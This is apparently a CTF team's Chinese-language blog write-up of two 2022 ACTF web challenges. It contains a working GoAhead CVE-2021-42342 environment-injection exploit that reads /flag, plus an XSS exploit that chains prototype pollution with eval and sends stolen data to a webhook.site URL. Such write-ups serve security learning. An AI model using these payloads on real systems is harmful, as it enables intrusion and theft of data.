<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2022 ACTF SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次2022 ACTF 我们 SU 取得了第五名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 ACTF SU Writeup"><meta property="og:type" content="blog"><meta property="og:title" content="2022 ACTF SU Writeup"><meta property="og:url" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次2022 ACTF 我们 SU 取得了第五名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 ACTF SU Writeup"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/16568960717884.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/16568961281067.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689613752610.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689614713613.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689616141319.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689617935222.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689627196925.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689627791828.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689628168731.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689628604434.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689628945437.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689629281140.png"><meta property="og:image" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689630148543.png"><meta property="article:published_time" content="2022-07-04T04:59:30.000Z"><meta property="article:modified_time" content="2025-06-03T13:48:06.858Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="ACTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/16568960717884.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/"},"headline":"2022 ACTF SU Writeup","image":["https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/16568960717884.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/16568961281067.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689613752610.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689614713613.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689616141319.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689617935222.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689627196925.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689627791828.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689628168731.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689628604434.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689628945437.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689629281140.png","https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/165689630148543.png"],"datePublished":"2022-07-04T04:59:30.000Z","dateModified":"2025-06-03T13:48:06.858Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次2022 ACTF 我们 SU 取得了第五名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 ACTF SU Writeup"}</script><link rel="canonical" href="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-04T04:59:30.000Z" title="2022/7/4 12:59:30">2022-07-04</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-03T13:48:06.858Z" title="2025/6/3 21:48:06">2025-06-03</time></span><span class="level-item">40 minutes read (About 6039 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2022 ACTF SU Writeup</h1><div class="content"><p>本次2022 ACTF 我们 SU 取得了第五名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#x65;&#x72;&#115;&#95;&#120;&#x63;&#x74;&#102;&#x40;&#49;&#50;&#54;&#x2e;&#99;&#111;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 ACTF SU Writeup</p>
<span id="more"></span>
<hr>
<p>本次2022 ACTF 我们 SU 取得了第五名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#x75;&#x65;&#x72;&#115;&#x5f;&#120;&#x63;&#x74;&#x66;&#64;&#49;&#50;&#x36;&#x2e;&#x63;&#111;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 ACTF SU Writeup</p>
<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="gogogo">gogogo</span><a href="#gogogo" class="header-anchor"></a></h2><p>先看dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:buster</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -ex \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list &amp;&amp; sed -i <span class="string">&#x27;s/security.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install wget make gcc -y \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz | tar zx --strip-components 1 -C /usr/src/ \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">cd</span> /usr/src \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make SHOW=1 ME_GOAHEAD_UPLOAD_DIR=<span class="string">&quot;&#x27;\&quot;/tmp\&quot;&#x27;&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make install \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">cp</span> src/self.key src/self.crt /etc/goahead/ \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> -p /var/www/goahead/cgi-bin/ \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get purge -y --auto-remove wget make gcc \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">cd</span> /var/www/goahead \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /usr/src/ /var/lib/apt/lists/* \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; sed -e <span class="string">&#x27;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#x27;</span> -i /etc/goahead/route.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 644 /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> hello /var/www/goahead/cgi-bin/hello</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /var/www/goahead/cgi-bin/hello</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r ctf &amp;&amp; useradd -r -g ctf ctf</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;goahead&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--home&quot;</span>, <span class="string">&quot;/etc/goahead&quot;</span>, <span class="string">&quot;/var/www/goahead&quot;</span>, <span class="string">&quot;0.0.0.0:8081&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>这里是用了一个goahead，而这里的hello路由放在了cgi-bin里面，而且输出了env</p>
<p><img src="./16568960717884.png" alt="img"></p>
<p>那么就不难找到是gohead的CVE-2021-42342，这个cve的内容是文件上传过滤器的处理缺陷，当与CGI处理程序一起使用时，可影响环境变量，从而导致RCE</p>
<p>记得p牛复现这个漏洞的时候踩坑专门写了篇<a href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">文章</a> </p>
<p>这和题目dockerfile如出一辙</p>
<p><img src="./16568961281067.png"></p>
<p>而且我们的确可以传文件</p>
<p><img src="./165689613752610.png"></p>
<p>接下来就是劫持LD_PRELOAD，对于这个东西的了解可以参考如下</p>
<blockquote>
<p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
</blockquote>
<p>我们编译一个so文件，因为可以操控env，那么我们传上去绑定LD_PRELOAD，然后就可以达到攻击的目的，但是我始终没复现成功</p>
<p>利用p牛复现的时候的技巧，添加脏字符让长度超过content-length还是没有起作用，不知道是不是没有注意到什么细节</p>
<p><img src="./165689614713613.png"></p>
<p>后来发现p牛其实还发过一个<a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">文章</a>，也是关于环境变量攻击的</p>
<p><img src="./165689616141319.png"></p>
<p>这里用</p>
<p><code>BASH_FUNC_xxx%%=()&#123;id;&#125;</code>，把原函数给覆盖掉</p>
<p>然后看到hello里面，他是执行了env的，所以我们把env给覆盖掉</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASH_FUNC_env%%:(None,<span class="string">&quot;() &#123; cat /flag; exit; &#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>即注册一个这样变量，让他执行env的时候，变成执行我们定义的函数内容</p>
<p>最后exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;BASH_FUNC_env%%&quot;</span>:(<span class="literal">None</span>,<span class="string">&quot;() &#123; cat /flag; exit; &#125;&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&quot;http://123.60.84.229:10218/cgi-bin/hello&quot;</span>,files=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<p><img src="./165689617935222.png"></p>
<h2><span id="poorui">poorui</span><a href="#poorui" class="header-anchor"></a></h2><p>在 compile template 的时候用到了旧版本的 lodash，有 prototype pollution 可以打。</p>
<p>在 render image 时用了 &lt;div {…attrs} &#x2F;&gt;，可以传入自定义属性</p>
<p>传入 <code>is=&quot;abc&quot;</code> 跟 <code>onanimationstart=&quot;JS_code&quot;</code> 即可 XSS</p>
<p>做到 XSS 以后借由去复盖 JSON.stringify 改变传出去的 msg，再借由复盖 JSON.parse 拿到 response，即可拿到 flag</p>
<p>exp 如下 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">logDiv</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> exp = <span class="title function_">btoa</span>(<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">window.send=(msg)=&gt;&#123;fetch(&#x27;https://webhook.site/2f5fbcb1-c4aa-473a-adfd-23a7c5e19509?q=&#x27;+encodeURIComponent(msg))&#125;;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">send(&#x27;start&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">window.backup=JSON.stringify;window.backup2=JSON.parse;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">JSON.stringify=function(json)&#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">  JSON.stringify = backup;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">  return backup(&#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    api: &#x27;getflag&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">  &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&#125;;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">JSON.parse=function(str)&#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">  send(str);</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">  return backup2(str)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&#125;;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">document.querySelector(&#x27;button[type=submit]&#x27;).click();</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">log</span>(<span class="params">msg</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(msg)</span></span><br><span class="line"><span class="language-javascript">      logDiv.<span class="property">innerText</span> += msg + <span class="string">&#x27;\n&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> <span class="variable constant_">WS_URL</span> = <span class="string">&#x27;ws://124.71.181.238:8081&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//WS_URL = &#x27;ws://localhost:8081&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> socket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="variable constant_">WS_URL</span>)</span></span><br><span class="line"><span class="language-javascript">    socket.<span class="property">onopen</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">log</span>(<span class="string">&#x27;connected&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> msg = &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">api</span>: <span class="string">&quot;ping&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: <span class="string">&quot;hello world&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        socket.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(msg))</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">start</span>()</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    socket.<span class="property">onmessage</span> = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> msg = e.<span class="property">data</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">log</span>(<span class="string">&#x27;received:&#x27;</span>+msg)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    socket.<span class="property">onclose</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;closed&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// change here if you want to xss other use </span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> to = <span class="string">&#x27;admin&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// prototype pollution</span></span></span><br><span class="line"><span class="language-javascript">      socket.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">api</span>: <span class="string">&#x27;sendmsg&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          to,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">msg</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&#x27;tpl&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">tpl</span>: <span class="string">&#x27;test.tpl&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">ctx</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">constructor</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="attr">prototype</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">username</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">allowImage</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">                  &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">              &#125;)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;))</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// trigger XSS</span></span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        socket.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">api</span>: <span class="string">&#x27;sendmsg&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            to,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">type</span>: <span class="string">&#x27;image&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">src</span>: <span class="string">&#x27;https://webhook.site/2f5fbcb1-c4aa-473a-adfd-23a7c5e19509?q=image&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">attrs</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="attr">wow</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="attr">is</span>: <span class="string">&#x27;abc&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="attr">onanimationstart</span>: <span class="string">`eval(atob(&quot;<span class="subst">$&#123;exp&#125;</span>&quot;))`</span>,</span></span><br><span class="line"><span class="language-javascript">                  <span class="attr">style</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">animation</span>: <span class="string">&#x27;1s App-logo-spin&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                  &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">              &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;))</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">      </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

